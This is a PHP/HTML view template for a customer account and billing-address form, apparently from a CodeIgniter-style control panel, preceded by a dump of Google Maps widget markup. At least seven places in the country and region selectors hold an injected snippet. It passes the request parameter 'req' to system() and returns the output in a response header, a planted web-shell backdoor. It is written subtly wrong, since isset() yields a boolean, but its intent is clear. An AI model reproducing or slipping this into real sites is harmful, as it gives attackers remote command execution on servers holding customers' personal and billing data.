src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16462!3i28862!4i256!2m3!1e0!2sm!3i338005947!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=124291" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: 183px; top: -176px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16461!3i28861!4i256!2m3!1e0!2sm!3i338005935!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=51102" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: 183px; top: 336px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16461!3i28863!4i256!2m3!1e0!2sm!3i338006007!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=46365" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: 439px; top: 336px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16462!3i28863!4i256!2m3!1e0!2sm!3i338006007!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=6644" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: -73px; top: 80px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16460!3i28862!4i256!2m3!1e0!2sm!3i338005935!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=126844" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: 695px; top: 80px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16463!3i28862!4i256!2m3!1e0!2sm!3i338005947!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=84570" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: -73px; top: 336px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16460!3i28863!4i256!2m3!1e0!2sm!3i338006007!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=86086" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: -73px; top: -176px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16460!3i28861!4i256!2m3!1e0!2sm!3i338005935!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=90823" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: 695px; top: -176px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16463!3i28861!4i256!2m3!1e0!2sm!3i338005947!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=48549" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="transform: translateZ(0px); position: absolute; left: 695px; top: 336px; transition: opacity 200ms ease-out;"><img src="http://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i16!2i16463!3i28863!4i256!2m3!1e0!2sm!3i338005935!3m9!2sen-US!3sUS!5e18!12m1!1e47!12m3!1e37!2m1!1ssmartmaps!4e0&amp;token=43702" draggable="false" alt="" style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div></div></div></div><div style="position: absolute; left: 0px; top: 0px; z-index: 2; width: 100%; height: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 3; width: 100%; transform-origin: 0px 0px 0px; transform: matrix(1, 0, 0, 1, 0, 0);"><div style="transform: translateZ(0px); position: absolute; left: 0px; top: 0px; z-index: 104; width: 100%;"></div><div style="transform: translateZ(0px); position: absolute; left: 0px; top: 0px; z-index: 105; width: 100%;"></div><div style="transform: translateZ(0px); position: absolute; left: 0px; top: 0px; z-index: 106; width: 100%;"><div class="gmnoprint" style="width: 22px; height: 40px; overflow: hidden; position: absolute; opacity: 0.01; left: 419px; top: 160px; z-index: 200;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/spotlight-poi.png" draggable="false" usemap="#gmimap0" style="position: absolute; left: 0px; top: 0px; width: 22px; height: 40px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"><map name="gmimap0" id="gmimap0"><area href="javascript:void(0)" log="miw" coords="8,0,5,1,4,2,3,3,2,4,2,5,1,6,1,7,0,8,0,14,1,15,1,16,2,17,2,18,3,19,3,20,4,21,5,22,5,23,6,24,7,25,7,27,8,28,8,29,9,30,9,33,10,34,10,40,11,40,11,34,12,33,12,30,13,29,13,28,14,27,14,25,15,24,16,23,16,22,17,21,18,20,18,19,19,18,19,17,20,16,20,15,21,14,21,8,20,7,20,6,19,5,19,4,18,3,17,2,16,1,14,1,13,0,8,0" shape="poly" title="" style="cursor: pointer;"></map></div></div><div style="transform: translateZ(0px); position: absolute; left: 0px; top: 0px; z-index: 107; width: 100%;"></div></div></div><div style="padding: 15px 21px; border: 1px solid rgb(171, 171, 171); font-family: Roboto, Arial, sans-serif; color: rgb(34, 34, 34); box-shadow: rgba(0, 0, 0, 0.2) 0px 4px 16px; z-index: 10000002; display: none; width: 256px; height: 148px; position: absolute; left: 281px; top: 110px; background-color: white;"><div style="padding: 0px 0px 10px; font-size: 16px;">Map Data</div><div style="font-size: 13px;">Map data ©2016 Google, INEGI</div><div style="width: 13px; height: 13px; overflow: hidden; position: absolute; opacity: 0.7; right: 12px; top: 12px; z-index: 10000; cursor: pointer;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/mapcnt6.png" draggable="false" style="position: absolute; left: -2px; top: -336px; width: 59px; height: 492px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div></div><div class="gmnoprint" style="z-index: 1000001; position: absolute; right: 166px; bottom: 0px; width: 151px;"><div draggable="false" class="gm-style-cc" style="-webkit-user-select: none; height: 14px; line-height: 14px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="width: auto; height: 100%; margin-left: 1px; background-color: rgb(245, 245, 245);"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a style="color: rgb(68, 68, 68); text-decoration: none; cursor: pointer; display: none;">Map Data</a><span style="">Map data ©2016 Google, INEGI</span></div></div></div><div class="gmnoscreen" style="position: absolute; right: 0px; bottom: 0px;"><div style="font-family: Roboto, Arial, sans-serif; font-size: 11px; color: rgb(68, 68, 68); direction: ltr; text-align: right; background-color: rgb(245, 245, 245);">Map data ©2016 Google, INEGI</div></div><div class="gmnoprint gm-style-cc" draggable="false" style="z-index: 1000001; -webkit-user-select: none; height: 14px; line-height: 14px; position: absolute; right: 95px; bottom: 0px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="width: auto; height: 100%; margin-left: 1px; background-color: rgb(245, 245, 245);"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a href="https://www.google.com/intl/en-US_US/help/terms_maps.html" target="_blank" style="text-decoration: none; cursor: pointer; color: rgb(68, 68, 68);">Terms of Use</a></div></div><div style="width: 25px; height: 25px; margin-top: 10px; overflow: hidden; display: none; margin-right: 14px; position: absolute; top: 0px; right: 0px;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/sv5.png" draggable="false" class="gm-fullscreen-control" style="position: absolute; left: -52px; top: -86px; width: 164px; height: 112px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px;"></div><div draggable="false" class="gm-style-cc" style="-webkit-user-select: none; height: 14px; line-height: 14px; position: absolute; right: 0px; bottom: 0px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="width: auto; height: 100%; margin-left: 1px; background-color: rgb(245, 245, 245);"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a target="_new" title="Report errors in the road map or imagery to Google" href="https://www.google.com/maps/@20.9692898,-89.5717167,16z/data=!10m1!1e1!12b1?source=apiv3&amp;rapsrc=apiv3" style="font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); text-decoration: none; position: relative;">Report a map error</a></div></div><div class="gmnoprint" draggable="false" controlwidth="28" controlheight="93" style="margin: 10px; -webkit-user-select: none; position: absolute; bottom: 107px; right: 28px;"><div class="gmnoprint" controlwidth="28" controlheight="55" style="position: absolute; left: 0px; top: 38px;"><div draggable="false" style="-webkit-user-select: none; box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 4px -1px; border-radius: 2px; cursor: pointer; width: 28px; height: 55px; background-color: rgb(255, 255, 255);"><div title="Zoom in" style="position: relative; width: 28px; height: 27px; left: 0px; top: 0px;"><div style="overflow: hidden; position: absolute; width: 15px; height: 15px; left: 7px; top: 6px;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/tmapctrl.png" draggable="false" style="position: absolute; left: 0px; top: 0px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none; width: 120px; height: 54px;"></div></div><div style="position: relative; overflow: hidden; width: 67%; height: 1px; left: 16%; top: 0px; background-color: rgb(230, 230, 230);"></div><div title="Zoom out" style="position: relative; width: 28px; height: 27px; left: 0px; top: 0px;"><div style="overflow: hidden; position: absolute; width: 15px; height: 15px; left: 7px; top: 6px;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/tmapctrl.png" draggable="false" style="position: absolute; left: 0px; top: -15px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none; width: 120px; height: 54px;"></div></div></div></div><div class="gm-svpc" controlwidth="28" controlheight="28" style="box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 4px -1px; border-radius: 2px; width: 28px; height: 28px; cursor: url(&quot;http://maps.gstatic.com/mapfiles/openhand_8_8.cur&quot;) 8 8, default; position: absolute; left: 0px; top: 0px; background-color: rgb(255, 255, 255);"><div style="position: absolute; left: 1px; top: 1px;"></div><div style="position: absolute; left: 1px; top: 1px;"><div aria-label="Street View Pegman Control" style="width: 26px; height: 26px; overflow: hidden; position: absolute; left: 0px; top: 0px;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/cb_scout5.png" draggable="false" style="position: absolute; left: -147px; top: -26px; width: 215px; height: 835px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div aria-label="Pegman is on top of the Map" style="width: 26px; height: 26px; overflow: hidden; position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/cb_scout5.png" draggable="false" style="position: absolute; left: -147px; top: -52px; width: 215px; height: 835px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div aria-label="Street View Pegman Control" style="width: 26px; height: 26px; overflow: hidden; position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/cb_scout5.png" draggable="false" style="position: absolute; left: -147px; top: -78px; width: 215px; height: 835px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div></div></div><div class="gmnoprint" controlwidth="28" controlheight="0" style="display: none; position: absolute;"><div title="Rotate map 90 degrees" style="width: 28px; height: 28px; overflow: hidden; position: absolute; border-radius: 2px; box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 4px -1px; cursor: pointer; display: none; background-color: rgb(255, 255, 255);"><img src="http://maps.gstatic.com/mapfiles/api-3/images/tmapctrl4.png" draggable="false" style="position: absolute; left: -141px; top: 6px; width: 170px; height: 54px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div class="gm-tilt" style="width: 28px; height: 28px; overflow: hidden; position: absolute; border-radius: 2px; box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 4px -1px; top: 0px; cursor: pointer; background-color: rgb(255, 255, 255);"><img src="http://maps.gstatic.com/mapfiles/api-3/images/tmapctrl4.png" draggable="false" style="position: absolute; left: -141px; top: -13px; width: 170px; height: 54px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div></div></div><div class="gmnoprint" style="margin: 10px; z-index: 0; position: absolute; cursor: pointer; left: 0px; top: 0px;"><div class="gm-style-mtc" style="float: left;"><div draggable="false" title="Show street map" style="direction: ltr; overflow: hidden; text-align: center; position: relative; color: rgb(0, 0, 0); font-family: Roboto, Arial, sans-serif; -webkit-user-select: none; font-size: 11px; padding: 8px; border-bottom-left-radius: 2px; border-top-left-radius: 2px; -webkit-background-clip: padding-box; box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 4px -1px; min-width: 21px; font-weight: 500; background-color: rgb(255, 255, 255); background-clip: padding-box;">Map</div><div style="z-index: -1; padding: 2px; border-bottom-left-radius: 2px; border-bottom-right-radius: 2px; box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 4px -1px; position: absolute; left: 0px; top: 36px; text-align: left; display: none; background-color: white;"><div draggable="false" title="Show street map with terrain" style="color: rgb(0, 0, 0); font-family: Roboto, Arial, sans-serif; -webkit-user-select: none; font-size: 11px; padding: 6px 8px 6px 6px; direction: ltr; text-align: left; white-space: nowrap; background-color: rgb(255, 255, 255);"><span role="checkbox" style="box-sizing: border-box; position: relative; line-height: 0; font-size: 0px; margin: 0px 5px 0px 0px; display: inline-block; border: 1px solid rgb(198, 198, 198); border-radius: 1px; width: 13px; height: 13px; vertical-align: middle; background-color: rgb(255, 255, 255);"><div style="position: absolute; left: 1px; top: -2px; width: 13px; height: 11px; overflow: hidden; display: none;"><img src="http://maps.gstatic.com/mapfiles/mv/imgs8.png" draggable="false" style="position: absolute; left: -52px; top: -44px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none; width: 68px; height: 67px;"></div></span><label style="vertical-align: middle; cursor: pointer;">Terrain</label></div></div></div><div class="gm-style-mtc" style="float: left;"><div draggable="false" title="Show satellite imagery" style="direction: ltr; overflow: hidden; text-align: center; position: relative; color: rgb(86, 86, 86); font-family: Roboto, Arial, sans-serif; -webkit-user-select: none; font-size: 11px; padding: 8px; border-bottom-right-radius: 2px; border-top-right-radius: 2px; -webkit-background-clip: padding-box; box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 4px -1px; border-left-width: 0px; min-width: 37px; background-color: rgb(255, 255, 255); background-clip: padding-box;">Satellite</div><div style="z-index: -1; padding: 2px; border-bottom-left-radius: 2px; border-bottom-right-radius: 2px; box-shadow: rgba(0, 0, 0, 0.298039) 0px 1px 4px -1px; position: absolute; right: 0px; top: 36px; text-align: left; display: none; background-color: white;"><div draggable="false" title="Show imagery with street names" style="color: rgb(0, 0, 0); font-family: Roboto, Arial, sans-serif; -webkit-user-select: none; font-size: 11px; padding: 6px 8px 6px 6px; direction: ltr; text-align: left; white-space: nowrap; background-color: rgb(255, 255, 255);"><span role="checkbox" style="box-sizing: border-box; position: relative; line-height: 0; font-size: 0px; margin: 0px 5px 0px 0px; display: inline-block; border: 1px solid rgb(198, 198, 198); border-radius: 1px; width: 13px; height: 13px; vertical-align: middle; background-color: rgb(255, 255, 255);"><div style="position: absolute; left: 1px; top: -2px; width: 13px; height: 11px; overflow: hidden;"><img src="http://maps.gstatic.com/mapfiles/mv/imgs8.png" draggable="false" style="position: absolute; left: -52px; top: -44px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none; width: 68px; height: 67px;"></div></span><label style="vertical-align: middle; cursor: pointer;">Labels</label></div></div></div></div><div style="margin-left: 5px; margin-right: 5px; z-index: 1000000; position: absolute; left: 0px; bottom: 0px;"><a target="_blank" href="https://maps.google.com/maps?ll=20.96929,-89.571717&amp;z=16&amp;t=m&amp;hl=en-US&amp;gl=US&amp;mapclient=apiv3" title="Click to see this area on Google Maps" style="position: static; overflow: visible; float: none; display: inline;"><div style="width: 66px; height: 26px; cursor: pointer;"><img src="http://maps.gstatic.com/mapfiles/api-3/images/google4.png" draggable="false" style="position: absolute; left: 0px; top: 0px; width: 66px; height: 26px; -webkit-user-select: none; border: 0px; padding: 0px; margin: 0px;"></div></a></div></div></div>
       </div>
      </div>
  
		</div><!--end .row -->
		
		
<div class="col-md-offset-1 col-md-9 hidden">

<div class="portlet portlet-default">

<div class="portlet-body">
               
<div class="row-fluid">       


<form class="form-horizontal" id="form_customer" method="post" action="<?=site_url($form_action);?>">
<div class="form-body">

<!-- BEGIN FORM-->
													
<div class="col-sm-12 hidden">
<div class="portlet-title"><div class="caption"> Account Details</div></div>
</div>

<div class="form-group">
																<label class="col-md-3 control-label">Customer Email</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-envelope"></i>
																		</span>
																		<input type="text" autocomplete="off" class="form-control email mark_empty" id="email" name="email" value="<?=$form['email'];?>" />
																	</div>
																</div>
															</div>


	<div class="form-group">
<label class="col-md-3 control-label">Customer ID</label>
																<div class="col-md-6">
																	<input type="text" class="form-control" disabled readonly id="internal_id" name="internal_id" value="<?=$form['internal_id'];?>" />
																	<em class="help-block"><small>.</small></em>
																</div>
															</div>
															
														<div class="col-sm-12">
<div class="portlet-title">
<div class="caption">
 Personal Details
</div>

</div>
</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="first_name">Name</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-user"></i>
																		</span>
																		<input class="form-control required mark_empty" rel="First Name" type="text" id="first_name" name="first_name" value="<?=$form['first_name'];?>" />&nbsp;&nbsp;<label style="display:none" for="last_name">Last Name</label><input class="form-control mark_empty" rel="Last Name" type="text" id="last_name" name="last_name" value="<?=$form['last_name'];?>" />
																	</div>
																</div>
															</div>
<div class="form-group">
																<label class="col-md-3 control-label">Phone</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-mobile"></i>
																		</span>
																		<input type="text" class="form-control" id="phone" name="phone" value="<?=$form['phone'];?>" />
																	</div>
																</div>
															</div>
															
															<div class="form-group">
																<label class="col-md-3 control-label" for="company">Company</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-building"></i>
																		</span>
																		<input type="text" class="form-control" id="company" name="company" value="<?=$form['company'];?>" />
																	</div>
																</div>
															</div>
														<div class="col-sm-12">
<div class="portlet-title">
<div class="caption">
 Billing Address
</div>

</div>
</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="address_1">Street Address</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																				<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" class="form-control" name="address_1" id="address_1" value="<?=$form['address_1'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="address_2">Address Line 2</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" class="form-control" name="address_2" id="address_2" value="<?=$form['address_2'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="city">City</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="locality" type="text" class="form-control" name="city" id="city" value="<?=$form['city'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="Country">Country</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /*
 																			<select geoname="country_short" id="country" name="country"><option value=""></option><? foreach ($countries as $country) { ?><option <? if ($form['country'] == $country['iso2']) { ?> selected="selected" <? } ?> value="<?=$country['iso2'];?>"><?=$country['name'];?></option><? } ?></select>
 																		*/ ?>
																		<div id="basic" data-button-type="form-control" data-input-name="country" data-selected-country="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['country']; ?>"></div>
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lat">Latitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lat" type="text" class="form-control" name="lat" id="lat" value="<?=$form['lat'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lng">Longitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lng" type="text" class="form-control" name="lng" id="lng" value="<?=$form['lng'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="state">Region</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" geoname="administrative_area_level_1" class="text" name="state" id="state" value="<?=$form['state'];?>" />
																		<select geoname="administrative_area_level_1_short" id="state_select" class="form-control" name="state_select"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																			foreach ($states as $state) {
																				if ($form['state'] == $state['code']) { ?>
																					<option  selected="selected"  value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																				} else { ?>
																					<option value="<?=$state['code'];?>"><?=$state['name'];?></option><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
																				}
																			} ?></select>
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="postal_code">Postal Code</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" geoname="postal_code" class="form-control" name="postal_code" id="postal_code" value="<?=$form['postal_code'];?>" />
																	</div>
																</div>
															</div>

															
															<div class="form-actions">
																<div class="row">
																	<div class="col-md-offset-1 col-md-9">
																		<input type="submit" class="btn btn-success btn-lg btn-block center" name="go_customer" value="<?=ucfirst($form_title);?>" />
																	</div>
																</div><!-- END row-->
															</div><!-- END form-actions-->			
															

</div><!-- END form-body-->
	</form><!-- END FORM-->
	
	</div><!--/row-fluid -->
	</div><!-- END portlet-body-->
	</div><!-- END portlet-->
		
		</div><!-- END/ col-md-offset-1 col-md-9 -->
								
							
</div><!-- col-md-12-->	

</div><!--/row -->
						
<?=$this->load->view(branded_view('cp/footer'));?>
 <!-- Bootstrap modal -->
  
  <div class="modal fade bs-example-customer-form in" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;">
                <div class="modal-dialog modal-lg modal-photo-viewer">
                    <div class="modal-content">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                            <h4 class="modal-title">Form title</h4>
                        </div>
                        <div class="modal-body no-padding">
                        <form class="form-horizontal" id="form_customer" method="post" action="<?=site_url($form_action);?>" role="form">
                                <div class="form-body">
                                 	<div class="form-group">
<label class="col-md-3 control-label">Customer ID</label>
																<div class="col-md-6">
																	<input type="text" class="form-control" disabled readonly id="internal_id" name="internal_id" value="<?=$form['customer_unique_id'];?>" />
																	<em class="help-block"><small>.</small></em>
																</div>
															</div>

															<div class="form-group">
  <label class="col-md-4 control-label" for="Name (Full name)">Name (Full name)</label>  
  <div class="col-md-4">
 <div class="input-group">
       <div class="input-group-addon">
        <i class="fa fa-user">
        </i>
       </div>
	   <input class="form-control input-md required mark_empty" rel="First Name" type="text" id="first_name" name="first_name" placeholder="Name (Full name)" value="<?=$form['first_name'];?>" />&nbsp;<input class="form-control mark_empty" rel="Last Name" type="text" id="last_name" name="last_name" value="<?=$form['last_name'];?>" />									
      </div>

															
															<div class="form-group">
																<label class="col-md-3 control-label" for="first_name">Name</label>
																<div class="col-md-6">
																	<div class="input-group inline">
																		<span class="input-group-addon">
																			<i class="fa fa-user"></i>
																		</span>
																		<input class="form-control required mark_empty" rel="First Name" type="text" id="first_name" name="first_name" value="<?=$form['first_name'];?>" />&nbsp;&nbsp;<label style="display:none" for="last_name">Last Name</label><input class="form-control mark_empty" rel="Last Name" type="text" id="last_name" name="last_name" value="<?=$form['last_name'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label">Customer Email</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-envelope"></i>
																		</span>
																		<input type="text" autocomplete="off" class="form-control email mark_empty" id="email" name="email" value="<?=$form['email'];?>" />
																	</div>
																</div>
															</div>
															
<div class="form-group">
																<label class="col-md-3 control-label">Phone</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-mobile"></i>
																		</span>
																		<input type="text" class="form-control" id="phone" name="phone" value="<?=$form['phone'];?>" />
																	</div>
																</div>
															</div>
															
															<div class="form-group">
																<label class="col-md-3 control-label" for="company">Company</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-building"></i>
																		</span>
																		<input type="text" class="form-control" id="company" name="company" value="<?=$form['company'];?>" />
																	</div>
																</div>
															</div>
															
														<div id="address_1" class="col-sm-12">
<div class="portlet-title">
<div class="caption">
 Billing Address
</div>

</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="address_1">Street Address</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																				<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" class="form-control" name="address_1" id="address_1" value="<?=$form['address_1'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group">
																<label class="col-md-3 control-label" for="address_2">Address Line 2</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input type="text" class="form-control" name="address_2" id="address_2" value="<?=$form['address_2'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="city">City</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="locality" type="text" class="form-control" name="city" id="city" value="<?=$form['city'];?>" />
																	</div>
																</div>
															</div>
															<div class="form-group">
																<label class="col-md-3 control-label" for="Country">Country</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); /*
 																			<select geoname="country_short" id="country" name="country"><option value=""></option><? foreach ($countries as $country) { ?><option <? if ($form['country'] == $country['iso2']) { ?> selected="selected" <? } ?> value="<?=$country['iso2'];?>"><?=$country['name'];?></option><? } ?></select>
 																		*/ ?>
																		<div id="basic" data-button-type="form-control" data-input-name="country" data-selected-country="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['country']; ?>"></div>
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lat">Latitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
																			<i class="fa fa-globe"></i>
																		</span>
																		<input geoname="lat" type="text" class="form-control" name="lat" id="lat" value="<?=$form['lat'];?>" />
																	</div>
																</div>
															</div>

															<div class="form-group hidden">
																<label class="col-md-3 control-label" for="lng">Longitude</label>
																<div class="col-md-6">
																	<div class="input-group">
																		<span class="input-group-addon">
